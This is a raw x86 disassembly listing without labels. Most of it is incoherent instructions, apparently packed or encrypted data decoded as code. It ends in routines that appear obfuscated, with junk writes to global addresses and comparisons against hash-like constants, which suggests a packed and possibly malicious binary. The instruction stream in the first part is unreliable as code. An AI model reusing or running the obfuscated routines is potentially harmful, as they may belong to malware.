  420005:	retf   
  420006:	rol    DWORD PTR gs:[esp+eiz*4-0x5c],1
  42000b:	pop    eax
  42000c:	pushf  
  42000d:	adc    ah,BYTE PTR [eax+0x4fee4005]
  420013:	add    al,0xae
  420015:	jbe    0x41fff9
  420017:	cmc    
  420018:	mov    WORD PTR [ebx+0x1c],ss
  42001b:	push   ebx
  42001c:	out    dx,al
  42001d:	fadd   DWORD PTR [esi-0x68]
  420020:	dec    esi
  420021:	mov    edi,0x5d633891
  420026:	fdivr  QWORD PTR [edx]
  420028:	(bad)  
  420029:	pusha  
  42002a:	inc    ebp
  42002b:	fldcw  WORD PTR [eax+0x19f86067]
  420031:	nop
  420032:	or     al,0x70
  420034:	mov    eax,0x2029f78b
  420039:	pop    esp
  42003a:	cld    
  42003b:	sahf   
  42003c:	cwde   
  42003d:	idiv   DWORD PTR ds:0xce223857
  420043:	ror    edx,0x16
  420046:	jmp    0x42004b
  420048:	nop
  420049:	scas   al,BYTE PTR es:[edi]
  42004a:	pop    esp
  42004b:	mov    dh,0x2
  42004d:	(bad)  
  42004e:	xchg   esp,eax
  42004f:	shl    DWORD PTR [edi-0x26],cl
  420052:	xchg   edx,eax
  420053:	mov    edi,DWORD PTR ss:[esi-0x7ba03641]
  42005a:	xor    BYTE PTR [eax+0x332f039],0x83
  420061:	xor    BYTE PTR [eax-0x65],dl
  420064:	or     DWORD PTR [ecx-0x51],ecx
  420067:	pop    edx
  420068:	inc    edi
  420069:	inc    ebp
  42006a:	pop    edi
  42006b:	jl     0x4200e1
  42006d:	lock ss mov edi,0xc9da4ebd
  420074:	imul   eax,ecx,0x3ae23616
  42007a:	ss dec ebx
  42007c:	test   DWORD PTR [ecx-0x18],0x902f6418
  420083:	pushf  
  420084:	pop    ebp
  420085:	add    BYTE PTR [edi],0xba
  420088:	hlt    
  420089:	aad    0xc6
  42008b:	cmp    ah,BYTE PTR [ebx-0x1]
  42008e:	sbb    al,bl
  420090:	pop    es
  420091:	scas   eax,DWORD PTR es:[edi]
  420092:	or     bl,BYTE PTR [esi]
  420094:	adc    eax,0x15cb346f
  420099:	mov    al,0xbe
  42009b:	retf   0xedc6
  42009e:	jl     0x420094
  4200a0:	les    edi,FWORD PTR [edi+eax*8-0x280eadc5]
  4200a7:	and    eax,0xfea32eb1
  4200ac:	je     0x420104
  4200ae:	leave  
  4200af:	inc    edx
  4200b0:	push   ss
  4200b1:	ss icebp 
  4200b3:	inc    edx
  4200b4:	and    DWORD PTR [ebp+ebx*8+0x5d],edi
  4200b8:	or     eax,0xc3ada452
  4200bd:	clc    
  4200be:	(bad)  [ebx]
  4200c0:	pushf  
  4200c1:	or     al,0x2f
  4200c3:	push   eax
  4200c4:	or     ebx,ebx
  4200c6:	cmp    esi,DWORD PTR [eax+0x49]
  4200c9:	aas    
  4200ca:	ror    DWORD PTR [edi+esi*1-0x31],1
  4200ce:	scas   al,BYTE PTR es:[edi]
  4200cf:	and    BYTE PTR [ecx+0x38],al
  4200d2:	cld    
  4200d3:	or     ecx,DWORD PTR [esi+0x70]
  4200d6:	ins    DWORD PTR es:[edi],dx
  4200d7:	(bad)  [ebx+0x579c0e3e]
  4200dd:	jecxz  0x4200a7
  4200df:	xchg   edi,eax
  4200e0:	adc    DWORD PTR [edi+0x13086fa0],0x259f7fd3
  4200ea:	fldenv [edx-0x7271ec12]
  4200f0:	cmp    esp,esi
  4200f2:	(bad)  
  4200f3:	es jg  0x420127
  4200f6:	fst    QWORD PTR [edi+0x4cab790d]
  4200fc:	stos   DWORD PTR es:[edi],eax
  4200fd:	ror    BYTE PTR [ebp+esi*2-0x4f],cl
  420101:	iret   
  420102:	mov    eax,0xd3151738
  420107:	inc    edx
  420108:	push   ebx
  420109:	sub    cl,ah
  42010b:	cmp    esi,edx
  42010d:	sti    
  42010e:	(bad)  
  420110:	pushf  
  420111:	div    DWORD PTR [eax+0x64b652e0]
  420117:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420118:	pop    esp
  420119:	mov    ecx,0xc1d570c6
  42011e:	retf   0x5f3e
  420121:	out    dx,eax
  420122:	xor    eax,0x39e8f8fb
  420127:	mov    al,ds:0x9e8ac43f
  42012c:	aad    0x24
  42012e:	sub    ebp,DWORD PTR [ebx]
  420130:	jge    0x4200b5
  420132:	inc    edi
  420133:	lods   eax,DWORD PTR ds:[esi]
  420134:	es mov dl,dh
  420137:	les    ebp,FWORD PTR [eax-0x37]
  42013a:	or     DWORD PTR [esi],0x35
  42013d:	int3   
  42013e:	xor    al,cl
  420140:	dec    edi
  420141:	xor    dh,bh
  420143:	aas    
  420144:	dec    ecx
  420145:	mov    fs,WORD PTR [ecx+0x227eff94]
  42014b:	repnz adc eax,0x19b87bf6
  420151:	add    BYTE PTR [eax+0x74566bef],ah
  420157:	ja     0x4200ef
  420159:	les    ebx,FWORD PTR ds:0x8669cc9b
  42015f:	repnz outs dx,DWORD PTR fs:[esi]
  420162:	mov    BYTE PTR [ecx+ebx*8],dl
  420165:	sbb    ch,BYTE PTR [edi+0x40]
  420168:	xchg   esi,eax
  420169:	add    al,0x5a
  42016b:	imul   esp,ecx,0x4d
  42016e:	or     DWORD PTR [eax-0x15],ebx
  420171:	adc    ecx,eax
  420173:	cld    
  420174:	pop    ss
  420175:	ss mov esi,0x4958705d
  42017b:	mov    eax,ds:0x77092734
  420180:	pop    es
  420181:	pop    esi
  420182:	call   0xba71:0x15191911
  420189:	jae    0x420114
  42018b:	mov    al,0x90
  42018d:	(bad)  
  420191:	adc    esi,eax
  420193:	adc    BYTE PTR ds:0xea0ae6b6,bh
  420199:	xor    BYTE PTR [ebx+0x47],ch
  42019c:	aas    
  42019d:	jbe    0x4201a6
  42019f:	pop    esi
  4201a0:	mov    ebp,DWORD PTR [ebx+0x7042e310]
  4201a6:	adc    DWORD PTR gs:[eax+0x4d],edi
  4201aa:	cmp    ebp,edx
  4201ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201ad:	(bad)  [ecx-0x57156dd4]
  4201b3:	sub    bh,BYTE PTR [ebx]
  4201b5:	(bad)  
  4201b6:	scas   al,BYTE PTR es:[edi]
  4201b7:	sar    DWORD PTR [ebx-0x57b7eaf3],cl
  4201bd:	repz xchg esi,eax
  4201bf:	mov    DWORD PTR [esi],esp
  4201c1:	mov    es,eax
  4201c3:	out    0xc7,al
  4201c5:	arpl   WORD PTR [edx-0x34f5721d],ax
  4201cb:	mov    DWORD PTR [edi+ebx*4-0x466970ee],0xe717abb6
  4201d6:	mov    ds:0x96d1d703,eax
  4201db:	repz sbb ch,BYTE PTR [edx-0x12]
  4201df:	lock jl 0x4201ce
  4201e2:	retf   0xea5f
  4201e5:	add    al,0x1a
  4201e7:	pop    esi
  4201e8:	mov    ecx,0x84ad15f9
  4201ed:	fsubr  QWORD PTR [eax]
  4201ef:	call   0x98afa578
  4201f4:	test   BYTE PTR [esi],ah
  4201f6:	mov    cl,0x31
  4201f8:	xchg   esp,eax
  4201f9:	dec    edi
  4201fa:	and    ecx,DWORD PTR [edi+0x5d]
  4201fd:	ror    esp,0x63
  420200:	push   edx
  420201:	mov    DWORD PTR [edx-0x35729df5],edi
  420207:	inc    ecx
  420208:	sub    BYTE PTR ds:0x599dd69c,al
  42020e:	and    edx,DWORD PTR [edi]
  420210:	jp     0x4201c3
  420212:	rcr    eax,0xce
  420215:	cmp    eax,0x715715f0
  42021a:	mov    al,ds:0x110fdcc
  42021f:	xchg   ebp,eax
  420220:	and    al,0x65
  420222:	fidiv  WORD PTR [esi+esi*4+0x52]
  420226:	adc    eax,0xf577e82c
  42022b:	cmp    al,cl
  42022d:	pop    esp
  42022e:	and    al,0x18
  420230:	daa    
  420231:	cs push 0xffffff92
  420234:	mov    al,0x7
  420236:	sub    BYTE PTR [edx-0x3f],0xe1
  42023a:	call   0x408c8beb
  42023f:	je     0x42028f
  420241:	lods   al,BYTE PTR ds:[esi]
  420242:	bound  ebp,QWORD PTR [edx+0x1d477ab6]
  420248:	stc    
  420249:	div    DWORD PTR [eax-0x262223f0]
  42024f:	fs mov bl,0x3d
  420252:	ds sub eax,0x247ff271
  420258:	mov    edx,0xb92807fe
  42025d:	pop    es
  42025e:	and    al,0xbf
  420260:	and    al,0x87
  420262:	mov    ebp,0xf37f643f
  420267:	pop    edi
  420268:	call   0xec60:0xc1bafc8f
  42026f:	add    eax,0x505d6414
  420274:	and    eax,0x96a99c5d
  420279:	xchg   BYTE PTR [ecx-0x58],ch
  42027c:	cwde   
  42027d:	std    
  42027e:	(bad)  
  42027f:	xor    eax,0x7dced9f7
  420284:	mov    ah,0x2b
  420286:	jo     0x420210
  420288:	pusha  
  420289:	icebp  
  42028a:	cmp    al,0x81
  42028c:	xchg   ecx,eax
  42028d:	outs   dx,BYTE PTR ds:[esi]
  42028e:	xor    al,0xa
  420290:	mov    ds:0xfc6eb2f7,eax
  420295:	test   DWORD PTR [eax+0x5f],edx
  420298:	in     eax,dx
  420299:	jno    0x4202bd
  42029b:	inc    edi
  42029c:	pop    es
  42029d:	mov    ebp,0xfd70dc
  4202a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202a3:	dec    esp
  4202a4:	pop    eax
  4202a5:	push   cs
  4202a6:	pop    esp
  4202a7:	and    DWORD PTR cs:[ecx],ebx
  4202aa:	push   ds
  4202ab:	mov    edi,0x79e7c36e
  4202b0:	icebp  
  4202b1:	cmovno esi,DWORD PTR [ebx+0x50babfc2]
  4202b8:	mov    bh,0x47
  4202ba:	inc    esi
  4202bb:	repz data16 sti 
  4202be:	sahf   
  4202bf:	sbb    BYTE PTR [ebx+0x16],ah
  4202c2:	sub    bh,dh
  4202c4:	push   0xfffffff1
  4202c6:	sub    al,0xa3
  4202c8:	or     DWORD PTR [eax+0x2e],edi
  4202cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202cc:	dec    esi
  4202cd:	xor    eax,0xa08ae1d
  4202d2:	mov    ds:0x3cc4edd4,eax
  4202d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202d8:	enter  0x590f,0xbe
  4202dc:	mov    eax,ds:0x7dd03cde
  4202e1:	add    bh,BYTE PTR [ebx+0x35]
  4202e4:	jno    0x42028b
  4202e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202e7:	mov    ebp,0x23e49f0d
  4202ec:	ret    
  4202ed:	sbb    DWORD PTR [ecx-0x40],ebp
  4202f0:	sbb    DWORD PTR [eax-0x7a774d57],0x3caf16f6
  4202fa:	in     eax,dx
  4202fb:	aaa    
  4202fc:	jl     0x4202e4
  4202fe:	(bad)  
  420300:	out    dx,eax
  420301:	mov    eax,esp
  420303:	bswap  edx
  420305:	out    0x19,al
  420307:	mov    ch,0xc5
  420309:	repnz dec edx
  42030b:	cmp    esi,DWORD PTR [ebp+0x39]
  42030e:	push   0x2
  420310:	dec    DWORD PTR [ebx+0x28]
  420313:	xchg   ebx,eax
  420314:	sbb    eax,0x5aba3903
  420319:	sbb    DWORD PTR [edi],0xbc9997a3
  42031f:	fsubr  QWORD PTR [edi]
  420321:	pushf  
  420322:	ficomp WORD PTR [ebp-0x1be5db35]
  420328:	js     0x4202e7
  42032a:	cmp    DWORD PTR [edx],0xffffffc1
  42032d:	sub    ebp,ebx
  42032f:	sbb    eax,DWORD PTR [edi]
  420331:	and    DWORD PTR [edx-0x57],ebx
  420334:	mov    al,0xf0
  420336:	imul   esi,DWORD PTR [ebx-0x7700ef],0x5ef97553
  420340:	ins    DWORD PTR es:[edi],dx
  420341:	imul   eax,eax,0x7d
  420344:	or     edi,esi
  420346:	jne    0x42034b
  420348:	mov    bh,0xee
  42034a:	mov    DWORD PTR [ebp+0x69],esi
  42034d:	scas   eax,DWORD PTR es:[edi]
  42034e:	lahf   
  42034f:	jbe    0x42039f
  420351:	(bad)  
  420352:	addr16 ds aas 
  420355:	leave  
  420356:	loopne 0x420374
  420358:	loope  0x42038e
  42035a:	icebp  
  42035b:	lods   al,BYTE PTR ds:[esi]
  42035c:	pushf  
  42035d:	stos   BYTE PTR es:[edi],al
  42035e:	mov    edx,0x4bba89d7
  420363:	les    esi,FWORD PTR [edx]
  420365:	ins    DWORD PTR es:[edi],dx
  420366:	jp     0x4203c9
  420368:	push   cs
  420369:	sbb    BYTE PTR [edi+0x35],dl
  42036c:	fisubr WORD PTR [ebp-0x53e6ae75]
  420372:	pushf  
  420373:	or     al,0xad
  420375:	and    eax,0xaaf7f0e6
  42037a:	sub    BYTE PTR [edx],dl
  42037c:	xor    ebx,DWORD PTR [edi]
  42037e:	sbb    ah,BYTE PTR [eax+0x1f]
  420381:	outs   dx,BYTE PTR ds:[esi]
  420382:	or     esp,esi
  420384:	or     BYTE PTR [eax+0x51ca795d],dl
  42038a:	pushf  
  42038b:	xor    DWORD PTR [eax],esp
  42038d:	jne    0x420366
  42038f:	xchg   ecx,eax
  420390:	je     0x42040c
  420392:	sahf   
  420393:	outs   dx,BYTE PTR es:[esi]
  420395:	mov    esi,0xe7b76c31
  42039a:	push   esp
  42039b:	es test eax,0x6d5737eb
  4203a1:	fldenv [edi+0x62]
  4203a4:	or     DWORD PTR [bp+si],eax
  4203a7:	add    eax,0xab741238
  4203ac:	mov    DWORD PTR [eax],edx
  4203ae:	pop    ecx
  4203af:	mov    esi,0xbe9d6b66
  4203b4:	dec    esp
  4203b5:	push   ds
  4203b6:	ins    BYTE PTR es:[edi],dx
  4203b7:	or     DWORD PTR [esi+eiz*8],eax
  4203ba:	adc    esi,DWORD PTR [edi+eiz*1]
  4203bd:	mov    bl,0x7e
  4203bf:	mov    cl,0xf4
  4203c1:	jnp    0x42037c
  4203c3:	cmc    
  4203c4:	je     0x420368
  4203c6:	stos   DWORD PTR es:[edi],eax
  4203c7:	cmp    BYTE PTR ds:0x86e0c05e,ah
  4203cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203ce:	jl     0x420433
  4203d0:	or     eax,0x2fb89b8f
  4203d5:	mov    al,0x3a
  4203d7:	retf   0xf43f
  4203da:	push   esp
  4203db:	fwait
  4203dc:	outs   dx,DWORD PTR ds:[esi]
  4203dd:	dec    ebx
  4203de:	out    0x7b,eax
  4203e0:	mov    al,0xfd
  4203e2:	push   ebp
  4203e3:	popa   
  4203e4:	jmp    0x420371
  4203e6:	ja     0x4203da
  4203e8:	imul   edi,DWORD PTR [ebp-0x55],0x5c5395f4
  4203ef:	pop    edx
  4203f0:	jl     0x4203b2
  4203f2:	aam    0x94
  4203f4:	mov    ds:0x99c8ed30,eax
  4203f9:	mov    ds:0xadd0c013,eax
  4203fe:	scas   eax,DWORD PTR es:[edi]
  4203ff:	pop    ebp
  420400:	push   edx
  420401:	fnstenv [edx]
  420403:	(bad)  
  420405:	jmp    0xcaa0:0xf6fbab0c
  42040c:	iret   
  42040d:	jmp    0x4591417f
  420412:	push   ebx
  420413:	jb     0x4203c1
  420415:	xchg   edi,eax
  420416:	jmp    0xc0b8923d
  42041b:	xor    bh,BYTE PTR [eax-0x48]
  42041e:	or     esp,esi
  420420:	lods   eax,DWORD PTR ds:[esi]
  420421:	add    al,dl
  420423:	ins    BYTE PTR es:[edi],dx
  420424:	cmp    DWORD PTR [esi+eiz*4+0x13],eax
  420428:	fistp  QWORD PTR [edi+0x68dc2534]
  42042e:	mov    edi,0x3fe1889e
  420433:	mov    ah,al
  420435:	adc    al,0x65
  420437:	pop    ds
  420438:	cwde   
  420439:	clc    
  42043a:	dec    ebx
  42043b:	mov    ds:0x3a3bbd03,al
  420440:	lea    esp,[ecx]
  420442:	loop   0x420432
  420444:	fnsave [edx]
  420446:	out    0x30,eax
  420448:	pop    ds
  420449:	pop    eax
  42044a:	inc    edi
  42044b:	cld    
  42044c:	shr    BYTE PTR [edx+0x5e],cl
  42044f:	cmp    ecx,eax
  420451:	cmp    dh,BYTE PTR [edx+0x46]
  420454:	daa    
  420455:	sub    ebp,ecx
  420457:	cwde   
  420458:	lods   al,BYTE PTR ds:[esi]
  420459:	or     DWORD PTR [eax+ebx*2],0xf448fca0
  420460:	jo     0x4203e5
  420462:	push   ebp
  420463:	mov    DWORD PTR [ebx+0x388c3b76],esp
  420469:	mov    BYTE PTR [ebp-0x47],ah
  42046c:	int    0x39
  42046e:	mov    al,ds:0x2d23f18e
  420473:	mov    eax,ds:0x46ab69ed
  420478:	out    dx,al
  420479:	(bad)  
  42047a:	sub    al,ah
  42047c:	in     al,0x26
  42047e:	cdq    
  42047f:	jns    0x420500
  420481:	rcl    BYTE PTR ds:0x2193f8cd,cl
  420487:	add    edx,DWORD PTR [ecx+0x0]
  42048a:	enter  0x5a16,0xe0
  42048e:	loopne 0x42043a
  420490:	mov    ds:0xa4423e7b,al
  420495:	or     al,0x19
  420497:	push   0x6617d751
  42049c:	enter  0xc4ef,0xd3
  4204a0:	jmp    0x4204fa
  4204a2:	pop    esp
  4204a3:	pop    ebp
  4204a4:	mov    bl,BYTE PTR [esi+0x146174f]
  4204aa:	mov    ebp,0xec52bc47
  4204af:	jle    0x420444
  4204b1:	int    0xbd
  4204b3:	rcr    DWORD PTR [ecx+0x75],1
  4204b6:	test   eax,0x1322b3be
  4204bb:	sbb    eax,0xe0350076
  4204c0:	xchg   ebx,eax
  4204c1:	test   eax,0x53aef749
  4204c6:	inc    esi
  4204c7:	jg     0x420494
  4204c9:	nop
  4204ca:	arpl   WORD PTR [edi],di
  4204cc:	lds    eax,FWORD PTR [ebp+0x78]
  4204cf:	loopne 0x420451
  4204d1:	dec    edi
  4204d2:	mov    ebp,0xa97e4d87
  4204d7:	or     ah,cl
  4204d9:	and    al,0xc1
  4204db:	cs pop ebx
  4204dd:	push   ecx
  4204de:	ret    
  4204df:	test   al,0xd1
  4204e1:	xchg   ecx,eax
  4204e2:	pop    esi
  4204e3:	push   eax
  4204e4:	rol    DWORD PTR [eax+0x1111530c],1
  4204ea:	add    DWORD PTR [edi+0x35c9631d],esi
  4204f0:	test   al,0xdc
  4204f2:	ss stos DWORD PTR es:[edi],eax
  4204f4:	popa   
  4204f5:	inc    edx
  4204f6:	add    al,0x52
  4204f8:	pop    ebp
  4204f9:	and    BYTE PTR [eax+0x479e1282],bh
  4204ff:	mov    bl,0xbd
  420501:	and    dh,ah
  420503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420504:	inc    esi
  420505:	addr16 xchg esi,eax
  420507:	lock shr DWORD PTR [eax-0xd],1
  42050b:	push   ecx
  42050c:	cmp    al,0x5e
  42050e:	xchg   BYTE PTR [edi-0x6b],dl
  420511:	add    al,0xcf
  420513:	pop    ebp
  420514:	icebp  
  420515:	enter  0x5f57,0x5
  420519:	dec    ebp
  42051a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42051b:	pop    ds
  42051c:	inc    esi
  42051d:	xchg   dl,dl
  42051f:	or     eax,0x850e9a52
  420524:	fwait
  420525:	xor    ecx,esp
  420527:	(bad)  
  420529:	sbb    BYTE PTR [ebx-0x8],ch
  42052c:	inc    esp
  42052d:	mov    eax,DWORD PTR [ebp-0x1271b0e2]
  420533:	and    al,0xbe
  420535:	dec    esp
  420536:	mov    dh,BYTE PTR [ecx-0x340de302]
  42053c:	rcl    edx,cl
  42053e:	loopne 0x420517
  420540:	paddw  mm0,QWORD PTR [eax+eax*1-0x6f]
  420545:	mov    ebx,0xd075f488
  42054a:	test   eax,0xaa7e2c46
  42054f:	or     BYTE PTR [edi+0x22],al
  420552:	sbb    BYTE PTR [esi+0x29],cl
  420555:	sbb    WORD PTR [edi-0x25],dx
  420559:	xchg   ecx,eax
  42055a:	ds adc ebp,ebp
  42055d:	sbb    BYTE PTR [ebp+0x39],ah
  420560:	jae    0x420535
  420562:	xchg   esp,eax
  420563:	push   esi
  420564:	(bad)  
  420565:	jb     0x4205cb
  420567:	je     0x420549
  420569:	mov    bl,0xfe
  42056b:	cmp    al,0x42
  42056d:	mov    al,ah
  42056f:	xchg   esi,eax
  420570:	cmp    esp,DWORD PTR ds:0x267f3338
  420576:	cmp    esi,DWORD PTR [edx+0x1ee45898]
  42057c:	pop    eax
  42057d:	adc    eax,0x91945b4c
  420582:	sub    DWORD PTR [eax+0x7506297d],esi
  420588:	(bad)  
  420589:	addr16 pop ebp
  42058b:	xchg   esp,eax
  42058c:	in     eax,0x38
  42058e:	xlat   BYTE PTR ds:[ebx]
  42058f:	mov    edi,0x327c9d25
  420594:	sub    edx,DWORD PTR ds:0x22183afb
  42059a:	cld    
  42059b:	xor    DWORD PTR [eax-0xe],ebp
  42059e:	jbe    0x420569
  4205a0:	shr    esi,1
  4205a2:	addr16 ja 0x420575
  4205a5:	fnstcw WORD PTR [ecx-0x7d]
  4205a8:	mov    esi,0x4c63fbb9
  4205ad:	ss inc edx
  4205af:	sbb    ah,ah
  4205b1:	sub    ebx,DWORD PTR [ebx-0x24]
  4205b4:	jo     0x42059f
  4205b6:	adc    BYTE PTR [edi],dh
  4205b8:	jl     0x420593
  4205ba:	push   0xb
  4205bc:	cmp    al,0xd7
  4205be:	cmovge esp,DWORD PTR ds:0xd07b9f4a
  4205c5:	les    ebp,FWORD PTR [edi+0x46]
  4205c8:	daa    
  4205c9:	test   DWORD PTR [edi],ebx
  4205cb:	ja     0x420591
  4205cd:	pop    eax
  4205ce:	add    edi,DWORD PTR [edi+edi*2+0x6a]
  4205d2:	jmp    0xbcf9:0xc12430cb
  4205d9:	push   ss
  4205da:	in     eax,0x96
  4205dc:	xor    eax,0x2d9d2c35
  4205e1:	popf   
  4205e2:	cwde   
  4205e3:	fimul  WORD PTR ds:0x7f8b6239
  4205e9:	xor    bh,BYTE PTR [edi+0x17]
  4205ec:	xor    eax,0x786cb36a
  4205f1:	scas   eax,DWORD PTR es:[edi]
  4205f2:	jns    0x420611
  4205f4:	jns    0x4205f0
  4205f6:	mov    edx,0x254e1e7d
  4205fb:	dec    edi
  4205fc:	cmp    eax,0xd0ea151f
  420601:	or     BYTE PTR [esi-0x39],0xd7
  420605:	ins    DWORD PTR es:[edi],dx
  420606:	push   edi
  420607:	inc    eax
  420608:	add    DWORD PTR [edx+edx*1],esp
  42060b:	(bad)  
  42060e:	or     bh,al
  420610:	clc    
  420611:	sub    eax,DWORD PTR [ebx+0x1f]
  420614:	mov    bh,0xea
  420616:	test   BYTE PTR [ecx+0x7b5561d0],ah
  42061c:	sbb    bh,BYTE PTR [esi]
  42061e:	ins    BYTE PTR es:[edi],dx
  42061f:	xor    bh,BYTE PTR [ecx+edi*1]
  420622:	pop    es
  420623:	inc    ebx
  420624:	jle    0x4205a6
  420626:	fbld   TBYTE PTR ds:0x14252bf2
  42062c:	mov    eax,0x51ac9820
  420631:	ja     0x42069a
  420633:	push   ss
  420634:	in     al,dx
  420635:	mov    ecx,0xfe1448dc
  42063a:	add    al,0xc7
  42063c:	sbb    eax,esp
  42063e:	(bad)  
  42063f:	sub    BYTE PTR [esi+0x75],dl
  420642:	fs pop ds
  420644:	add    ebx,DWORD PTR [edx-0x54]
  420647:	retf   0x665
  42064a:	(bad)
  42064d:	mov    esi,0x93e5558f
  420652:	inc    BYTE PTR [eax-0x408783fb]
  420658:	out    0x64,al
  42065a:	outs   dx,BYTE PTR fs:[esi]
  42065c:	inc    ebx
  42065e:	sub    eax,0x1d347465
  420663:	fwait
  420664:	sbb    DWORD PTR [edi],edx
  420666:	xchg   ebp,eax
  420667:	mov    bl,0xdb
  420669:	pop    es
  42066a:	retf   0x8a78
  42066d:	shl    BYTE PTR [edi-0x7ca45d4e],cl
  420673:	inc    edi
  420674:	push   0x22
  420676:	sub    al,0x87
  420678:	cmp    BYTE PTR [esi+eax*2+0x2a649ce5],0x79
  420680:	test   DWORD PTR [ecx],ebp
  420682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420683:	sbb    al,0xbd
  420685:	sbb    bl,BYTE PTR [esi+esi*1-0x5f]
  420689:	loop   0x4206ff
  42068b:	pop    esp
  42068c:	sbb    DWORD PTR [edi],edx
  42068e:	aam    0xa3
  420690:	adc    DWORD PTR [edi],0x14
  420693:	aas    
  420694:	jno    0x420681
  420696:	fisubr WORD PTR [eax+0xcb130cf]
  42069c:	push   ecx
  42069d:	xchg   ecx,eax
  42069e:	or     DWORD PTR [ebx+0x2e],eax
  4206a1:	add    eax,0x2d303ac5
  4206a6:	sub    BYTE PTR [esi-0x4e],dl
  4206a9:	in     eax,dx
  4206aa:	(bad)  
  4206ab:	and    ebx,DWORD PTR [esi-0x2d]
  4206ae:	(bad)  
  4206af:	out    dx,al
  4206b0:	scas   al,BYTE PTR es:[edi]
  4206b1:	outs   dx,BYTE PTR ds:[esi]
  4206b2:	fcom   DWORD PTR [edi+0x23f47c78]
  4206b8:	aad    0x65
  4206ba:	hlt    
  4206bb:	add    esi,edi
  4206bd:	or     ah,BYTE PTR [eax-0x15]
  4206c0:	scas   al,BYTE PTR es:[edi]
  4206c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206c2:	(bad)  
  4206c3:	aas    
  4206c4:	rol    BYTE PTR [edx],0x50
  4206c7:	mov    bh,0xba
  4206c9:	pop    ebp
  4206ca:	jp     0x420696
  4206cc:	loope  0x420685
  4206ce:	jp     0x42072d
  4206d0:	sbb    eax,0xd19ef1d3
  4206d5:	stos   DWORD PTR es:[edi],eax
  4206d6:	sub    ah,dh
  4206d8:	mov    dh,0x34
  4206da:	call   0xff3:0xa2cc06b1
  4206e1:	iret   
  4206e2:	and    DWORD PTR [ecx+0x67fa57d],ebp
  4206e8:	arpl   bx,ax
  4206ea:	add    DWORD PTR [ecx+0x7d8be47d],ecx
  4206f0:	or     BYTE PTR [ebx],dh
  4206f2:	stc    
  4206f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4206f6:	add    edi,edx
  4206f8:	cmp    ecx,edi
  4206fa:	je     0x42073c
  420700:	mov    ecx,DWORD PTR [ebp-0x18]
  420703:	add    ecx,eax
  420705:	mov    DWORD PTR [ebp-0x1c],ecx
  420708:	mov    ecx,DWORD PTR [ebp-0x30]
  42070b:	mov    edx,DWORD PTR [ebp-0x2c]
  42070e:	mov    edx,0xa143
  420713:	xor    cx,dx
  420716:	mov    edx,DWORD PTR [ebp-0x1c]
  420719:	mov    edx,DWORD PTR [edx+0xc]
  42071c:	add    cx,si
  42071f:	cmp    WORD PTR [eax+edx*1],cx
  420723:	jne    0x42073c
  420729:	mov    ecx,DWORD PTR ds:0x432373
  42072f:	mov    ecx,DWORD PTR [ecx+0x198]
  420735:	mov    DWORD PTR [ecx],eax
  420737:	jmp    0x420797
  42073c:	push   DWORD PTR [ebp+0x1c]
  42073f:	push   DWORD PTR [ebp+0x18]
  420742:	jmp    0x420786
  420747:	mov    eax,DWORD PTR [ebp+0x18]
  42074a:	mov    ecx,DWORD PTR [ebp+0x1c]
  42074d:	cmp    eax,0x70941f99
  420752:	jne    0x42076b
  420758:	cmp    ecx,ebx
  42075a:	jne    0x42076b
  420760:	push   ebx
  420761:	push   0x70941f9f
  420766:	jmp    0x420786
  42076b:	mov    eax,DWORD PTR [ebp+0x18]
  42076e:	mov    ecx,DWORD PTR [ebp+0x1c]
  420771:	cmp    eax,0x70941f9f
  420776:	jne    0x420797
  42077c:	cmp    ecx,ebx
  42077e:	jne    0x420797
  420784:	push   ebx
  420785:	push   edi
  420786:	push   DWORD PTR [ebp+0x14]
  420789:	push   DWORD PTR [ebp+0x10]
  42078c:	push   DWORD PTR [ebp+0xc]
  42078f:	push   DWORD PTR [ebp+0x8]
  420792:	call   0x41b999
  420797:	pop    edi
  420798:	pop    esi
  420799:	pop    ebx
  42079a:	leave  
  42079b:	ret    0x18
  42079e:	push   ebp
  42079f:	mov    ebp,esp
  4207a1:	and    esp,0xfffffff8
  4207a4:	adc    DWORD PTR ds:0x432e9f,0x432e5f
  4207ae:	sub    esp,0xcc
  4207b4:	push   ebx
  4207b5:	push   esi
  4207b6:	adc    DWORD PTR ds:0x432ecb,0x432e7f
  4207c0:	push   edi
  4207c1:	lea    eax,[esp+0x58]
  4207c5:	push   eax
  4207c6:	mov    BYTE PTR [esp+0xda],0x0
  4207ce:	and    DWORD PTR ds:0x432e83,0x432eb7
  4207d8:	call   DWORD PTR ds:0x43fe07
  4207de:	mov    DWORD PTR ds:0x432e9f,0x6fab
  4207e8:	mov    al,ds:0x432498
  4207ed:	cmp    al,BYTE PTR ds:0x4324a9
  4207f3:	mov    DWORD PTR ds:0x432e27,0x607e
  4207fd:	je     0x42081a
  420803:	push   0x0
  420805:	xor    DWORD PTR ds:0x432e63,0x595a
  42080f:	call   DWORD PTR ds:0x43fdc3
  420815:	jmp    0x42188d
  42081a:	mov    DWORD PTR ds:0x432e37,0x550e
  420824:	mov    al,ds:0x4324b5
  420829:	mov    DWORD PTR ds:0x432e27,0x154d
  420833:	cmp    al,BYTE PTR ds:0x4324c6
  420839:	mov    DWORD PTR ds:0x432e47,0x193
  420843:	je     0x420850
  420849:	xor    eax,eax
  42084b:	jmp    0x42188d
  420850:	mov    edi,DWORD PTR ds:0x43fdd7
  420856:	adc    DWORD PTR ds:0x432e8b,0x1314
  420860:	push   0x4324cf
  420865:	push   0x4324db
  42086a:	call   edi
  42086c:	adc    DWORD PTR ds:0x432ea3,0x432e9f
  420876:	test   eax,eax
  420878:	je     0x420849
  42087e:	and    DWORD PTR ds:0x432e6f,edx
  420884:	mov    DWORD PTR [esp+0x30],0x0
  42088c:	adc    esi,0x6be4
  420892:	mov    ecx,0xf89c85a5
  420897:	mov    DWORD PTR [esp+0x20],ecx
  42089b:	mov    ebx,DWORD PTR ds:0x432ecf
  4208a1:	add    DWORD PTR ds:0x432e8f,ebx
